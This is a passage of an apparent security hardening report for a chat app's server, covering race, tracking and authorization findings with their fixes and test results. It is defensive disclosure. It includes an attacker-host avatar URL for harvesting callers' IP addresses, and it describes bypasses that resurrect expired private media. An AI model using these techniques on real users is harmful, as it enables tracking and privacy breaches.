**Problem.** Both did read → check `meta.consumedAt == null` in JS → write, with an `await` (the participant lookup) in between. Two concurrent reveals of the same view-once message therefore both observed "not yet consumed", both passed, and both returned the captured content — the same lost-update class as the S1 PIN-lockout and S9 OTP races. It also amplified H6: N racing reveals each triggered a full storage fetch and base64 inline of the same object.
**Fix.** A shared `burnExpiringMessage` helper performs one conditional `UPDATE` guarded on `JSON_EXTRACT(meta,'$.consumedAt') IS NULL`, with the verdict taken from `affectedRows`; only the winner receives the content.

## H8 — `avatarUrl` accepted arbitrary external URLs (MED)

**Where:** `server/v2routers.ts` `AvatarUrlSchema`.
**Problem.** `/^https?:\/\//` was permitted, making a profile photo a remote-fetch primitive aimed at other users' browsers — and the avatar renders on the **incoming-call ring card**, which appears with no interaction from the callee. An attacker could set their avatar to `http://their-host/x.png`, dial a victim, and harvest the victim's **IP address and User-Agent from a call the victim never answered**. It also fired from thread lists, contact rows, and in-call tiles, giving a passive read on when a target is looking at them. This is the same threat the status-background sanitizer already rejects `url(...)` for, and it cuts directly against this app's stated no-tracing goal.
**Fix.** Restricted to our own `/manus-storage/` path or an inline `data:image/`. No compatibility cost: every client path sets this from our own upload endpoint or clears it to null, and it is never re-sent on an unrelated profile edit; the schema gates writes only, so pre-existing rows keep rendering.

## H9 — `status.post` skipped its ownership gate for text statuses (MED)

**Where:** `server/v2routers.ts`.
**Problem.** The `keyInOwnerNamespace` check lived only inside the media-kind `else` branch, but `input.mediaKey` was persisted for **every** kind. Since `authorizeStorageKey` resolves a `/status_` key by looking up whichever *active* status row claims it — and grants access to that row's owner and audience, checked before the attachment branch — a `kind:"text"` post could claim another user's status key and **re-activate** it. An expired or deleted status, whose media is supposed to be permanently unreachable ("truly ephemeral at the access layer even though the object lingers in the bucket"), became readable again by the planter and re-exposed to the planter's own audience. Anyone who was in the original audience while it was live already knows the key. Same laundering class as F2.
**Fix.** The gate applies whenever a key is supplied, regardless of kind, and a text status never persists media at all.

## H10 — reservation-ledger duplicate detection matched on error text (LOW)

**Where:** `server/v2db.ts` `tryReserveNumber`.
**Problem.** The helper fails **open** (returns `true`) for anything it doesn't recognize, and recognized the duplicate-key case only by `/duplicate/i` against the human-readable message. A driver upgrade, a localized server, or a wrapped error would silently turn every lost race into "reservation won", reintroducing the cross-table number collision the ledger exists to prevent — with no visible sign.
**Fix.** Key on mysql's stable machine-readable markers (`errno === 1062` / `code === "ER_DUP_ENTRY"`) first; the text sniff remains only as a fallback.

## Verified clean (documented negatives)

Recorded so the negative result is trustworthy rather than merely unstated:

- **No SQL injection.** Every `sql` template interpolates either a Drizzle column reference (serialized as an identifier) or a value via `${}`, which Drizzle parameterizes. The only literal table/column names are hardcoded. `unreadCount` is also correctly floored with `GREATEST(… - 1, 0)`.
- **Landing-page XSS intact after the v2.99.35 React-19 `innerHTML` rework.** `escLp` escapes all five dangerous characters, is applied *after* name composition, and every interpolation site is element-text context; labels use `textContent`; the appended arrow SVG is a constant.
- **Secret comparison.** `timingSafeEqual` used consistently for passwords, HMACs, and webhook signatures, each with a length check first (and the inbound one additionally wrapped in try/catch).
- **CSRF genuinely defended.** All cookies are `SameSite=Lax`, so the cookie path of the raw `text/plain`-accepting `POST /api/v2/offline` beacon cannot fire cross-site; its `deviceId` body fallback requires a secret the attacker doesn't have.
- **`keyInOwnerNamespace` correctly anchored** — the trailing slash defeats the `relay-chat/1/` vs `relay-chat/12/` prefix collision — and the v2.99.x absolute-URL avatar fix is unexploitable: you cannot simultaneously satisfy the `lastIndexOf`-based namespace gate and the `isIdentityAvatarKey` suffix match with a victim's key.
- **`searchMessages` filters expiring content**, so view-once bodies never surface through search.
- **`tabPresence`** stores no secrets, rebuilds a fresh object (no prototype pollution), and fails safe toward a delayed offline rather than a stuck-online.

## Accepted residual (round 5)

- **`push.subscribe` endpoint re-bind.** The unique key is on `endpoint` alone, so `onDuplicateKeyUpdate` re-binds the row to the caller — meaning someone who *knows* a victim's endpoint can silently kill their notifications (the sibling of G3, which was fixed on the `unsubscribe` side). Deliberately **not** changed: no API ever returns an endpoint, the hijacker gains nothing readable (pushes are encrypted to their own keys, so the victim just receives undecryptable ones), and the only correct fix is a proof-of-possession challenge/response — new infrastructure. Naively refusing a re-bind to a different identity would break the *documented* account-switch-on-the-same-device flow, silently killing notifications for real users, which is a worse and far more common failure than the attack.
- All prior-round residuals stand unchanged.

## Verification (round 5)

`pnpm check` clean; `pnpm test` **1540 passing / 1 skipped**; `pnpm build` clean. New `server/hardeningPass5.test.ts` (44 tests) — including a real arithmetic **simulation of MySQL's left-to-right assignment order** so H4's off-by-one cannot silently return, and the actual attribute-breakout payloads H1's pin guard must reject. Four stale pre-existing source pins were updated to the corrected shapes rather than weakened (`m11ContentGating` ×2, `peerIdentityBatch`, `qaBatch8`).
